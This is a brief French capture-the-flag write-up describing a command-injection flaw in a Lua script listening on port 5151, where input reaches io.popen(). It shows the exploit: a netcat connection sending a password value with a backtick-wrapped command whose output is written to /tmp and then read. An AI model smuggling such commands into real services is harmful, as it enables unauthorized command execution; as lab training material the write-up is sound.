# on a ici un script lua qui tourne sur le port 5151 de la machine.

La faille ici est la fonction io:popen() qui execute une commande dans un nouveau shell.
Comme notre input est donne a cette commande, on a la possibilite de faire une injection de commande.

nc localhost 5151
Password:`getflag` > /tmp/oui ; echo lol
cat /tmp/oui

On a le flag du level 12 !
